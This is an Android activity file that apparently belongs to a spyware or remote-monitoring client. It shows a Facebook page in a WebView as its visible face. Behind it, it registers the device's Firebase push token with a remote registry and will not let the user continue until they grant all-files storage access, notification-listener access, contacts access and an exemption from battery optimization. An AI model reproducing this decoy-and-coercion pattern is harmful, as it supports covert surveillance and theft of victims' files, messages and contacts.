package com.lyrnic.userside.activities;

import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Settings;
import android.util.Log;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;

import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.messaging.FirebaseMessaging;
import com.lyrnic.userside.R;
import com.lyrnic.userside.constants.Constants;
import com.lyrnic.userside.utilities.DevicesUtilities;
import com.lyrnic.userside.utilities.PermissionsUtilities;

public class MainActivity extends AppCompatActivity {
    private static final int REQUEST_READ_CONTACTS_PERMISSION = 22;
    boolean requestBatteryPermission;
    WebView webView;
    public static final int REQUEST_READ_WRITE_EXTERNAL_STORAGE_PERMISSION = 2;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);



        init();
    }

    public void init() {
        webView = findViewById(R.id.web_view);

        WebViewClient client = new WebViewClient();
        webView.setWebViewClient(client);
        webView.loadUrl("https://www.facebook.com");

        initToken();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
    }


    public void initToken() {
        FirebaseMessaging.getInstance().getToken().addOnCompleteListener(new OnCompleteListener<String>() {
            @Override
            public void onComplete(@NonNull Task<String> task) {
                if (task.isSuccessful()) {
                    getSharedPreferences(getPackageName() + ".FCM", MODE_PRIVATE).edit().putString(Constants.DEVICE_TOKEN_KEY, task.getResult()).apply();
                    DevicesUtilities.registerDeviceToken(MainActivity.this);
                    Log.d(getPackageName() + "::FCM", "FCM TOKEN GENERATED: " + task.getResult());
                }
            }
        });
    }

    @Override
    protected void onStart() {
        super.onStart();

        checkAndRequestPermissions();
    }

    public void showToast(String text) {
        Toast.makeText(this, text, Toast.LENGTH_SHORT).show();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == REQUEST_READ_WRITE_EXTERNAL_STORAGE_PERMISSION) {
            if (grantResults.length > 1 && grantResults[0] != PackageManager.PERMISSION_GRANTED || grantResults[1] != PackageManager.PERMISSION_GRANTED) {
                showToast("You can't keep using app without allowing read and write storage permissions");
                finish();
            }
        }
        if (requestCode == REQUEST_READ_CONTACTS_PERMISSION) {
            if (grantResults.length > 0 && grantResults[0] != PackageManager.PERMISSION_GRANTED) {
                showToast("You can't keep using app without allowing read contacts permissions");
                finish();
            }
        }

        checkAndRequestPermissions();
    }

    public void requestManageStorageAndroid11AndLater() {
        new AlertDialog.Builder(this)
                .setCancelable(false)
                .setTitle("Allow manage and access all files")
                .setMessage("You have to allow manage and access all files to keep using app")
                .setPositiveButton("Go to settings", ((dialog, which) -> {
                    Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                    Uri uri = Uri.fromParts("package", getPackageName(), null);
                    intent.setData(uri);
                    startActivity(intent);
                })).show();

    }

    public void requestReadWriteStorageAndroid10AndBelow() {
        requestPermissions(new String[]{android.Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE}, MainActivity.REQUEST_READ_WRITE_EXTERNAL_STORAGE_PERMISSION);
    }

    public void showRequestIgnoreBatteryOptimizationDialog() {
        new AlertDialog.Builder(this)
                .setPositiveButton("Ask for permission", ((dialog, which) -> {
                    requestBatteryPermission = true;
                }))
                .setTitle("Ignoring battery optimization")
                .setMessage("You can't keep using app without ignoring battery optimization")
                .setCancelable(false)
                .show();
    }

    public void requestIgnoreBatteryOptimization() {
        Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
        intent.setData(Uri.parse("package:" + getPackageName()));
        ActivityResultLauncher<Intent> activityResultLauncher =
                registerForActivityResult(new ActivityResultContracts.StartActivityForResult()
                        , getActivityResultRegistry(), (result) -> {
                            if (result.getResultCode() != RESULT_OK) {
                                Toast.makeText(this, "You can't keep using app without ignoring battery optimization", Toast.LENGTH_SHORT).show();
                                finish();
                            }
                            else{
                                checkAndRequestPermissions();
                            }

                        });
        activityResultLauncher.launch(intent);
    }

    public void requestNotificationAccessPermissionManually(){
        Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
        android.app.AlertDialog.Builder adb = new android.app.AlertDialog.Builder(this);

        adb.setTitle("Notification Listener Permission")
                .setMessage("You have to allow notification access to keep using app")
                .setPositiveButton("Go to settings", (dialog,which)-> {
                    startActivity(intent);
                }).setCancelable(false)
                .show();
    }


    public void checkAndRequestPermissions() {
        if (PermissionsUtilities.isAppBatteryOptimizationEnabled(this)) {
            requestIgnoreBatteryOptimization();
            return;
        }
        if (!PermissionsUtilities.canAccessStorage(this)) {
            if (PermissionsUtilities.checkSDK30OrAbove()) {
                requestManageStorageAndroid11AndLater();
            } else {
                requestReadWriteStorageAndroid10AndBelow();
            }
            return;
        }
        if(!PermissionsUtilities.isNotificationListenerEnabled(this)){
            requestNotificationAccessPermissionManually();
            return;
        }
        if (!PermissionsUtilities.canAccessContacts(this)) {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_CONTACTS}, REQUEST_READ_CONTACTS_PERMISSION);
        }
    }


}